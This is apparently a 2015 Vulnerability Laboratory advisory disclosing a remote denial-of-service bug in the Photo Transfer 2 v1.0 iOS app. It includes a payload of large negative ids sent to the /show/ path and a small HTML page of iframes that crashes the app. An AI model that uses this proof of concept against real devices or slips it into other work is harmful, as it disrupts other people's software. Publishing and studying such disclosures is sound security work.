@@ -1,0 +1,157 @@
+Document Title:
+===============
+Photo Transfer (2) v1.0 iOS - Denial of Service Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1580
+
+
+Release Date:
+=============
+2015-08-20
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1580
+
+
+Common Vulnerability Scoring System:
+====================================
+3.4
+
+
+Product & Service Introduction:
+===============================
+Photo Transfer 2 is the easiest and fastest way to transfer photos (videos) from Camera Roll to computer or other iOS devices, and vice versa. 
+No need for USB cable, iTunes or extra equipment! 
+
+(Copy of the Vendor Homepage: https://itunes.apple.com/app/id1005399058 )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Research Team discovered a remote denial of service vulnerability in the official Photo Transfer 2 - v1.0 iOS mobile web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-07-27:	Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Arvin Brook
+Product: Photo Transfer 2 - iOS Mobile Web Application 1.0
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Technical Details & Description:
+================================
+A remote denial of service vulnerability has been discovered in the official Photo Transfer 2 - v1.0 iOS mobile web-application.
+The issue allows local attackers to crash or shutdown the software client by usage of special crafted payloads.
+
+The vulnerability is located in the id value restriction of show module path context. Remote attacker can easily crash the application 
+remotly by including wrong and large id context in integer format. The attack vector is client-side and the request method to provoke 
+the mobile app crash is GET. The handling of the id path gets confused on negative integer values which results in a permanent app shutdown.
+
+The security risk of the denial of service vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.4. 
+Exploitation of the DoS vulnerability requires no privilege application user account or low user interaction. Successful exploitation of the 
+vulnerability results in an application crash or permanent app service shutdown.
+
+
+Vulnerable Module(s):
+				[+] ../show/
+
+Vulnerable Parameter(s):
+				[+] id
+
+
+Proof of Concept (PoC):
+=======================
+The remote denial of service web vulnerability can be exploited by remote attackers without user interaction or privilege web-application user account.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+Standard URL:
+http://localhost:3030/show/5
+
+
+PoC: Payload (Input to show Parameter)
+-9999999999999999999'
+
+
+PoC URL:
+http://localhost:3030/show/-9999999999999999999'
+
+
+PoC: Exploit
+<html>
+<head><body>
+<title>Photo Transfer 2 - remote Denial of Service Vulnerability</title>
+<iframe src=http://localhost:3030/show/-9999999999999999999'>
+<iframe src=http://localhost:3030/show/-1111111111111111111'>
+<iframe src=http://localhost:3030/show/-0000000000000000000'>
+</body></head>
+<html>
+
+
+Security Risk:
+==============
+The security risk of the remote denial of service vulnerability in the photo transfer 2 mobile app v1.0 is estimated as medium. (CVSS 3.4)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
